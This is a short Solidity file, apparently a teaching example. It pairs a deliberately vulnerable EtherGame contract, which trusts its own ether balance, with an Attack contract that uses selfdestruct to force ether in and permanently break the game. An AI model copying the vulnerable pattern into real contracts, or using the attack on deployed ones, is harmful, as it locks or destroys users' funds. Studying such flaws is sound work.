// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract EtherGame{

    uint public targetAmount = 7 ether;
    address payable public winner;


    function deposit()public payable{
        require(msg.value == 1 ether,"you could only send 1 eth");
        uint balance = address(this).balance;
        require(balance <= targetAmount,"Game is over");
        if(balance == targetAmount){
            winner = payable(msg.sender);
        }
    }

    function claimReward()public {
        require(msg.sender == winner,"You are not the winner");
        // (bool sent,) =  msg.sender.call{value:address(this).balance}("");
        // require(sent, "Failed to send the ether");
        winner.transfer(address(this).balance);
    }
}

contract Attack{
    EtherGame etherGame;
    
    constructor(EtherGame _ethergame){
        etherGame= EtherGame(_ethergame);
    }

    function attack()public payable{
       
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}

 // You can break the game by sending the ether so that 
        // he game balance is => 7
        // Cast address to payable 
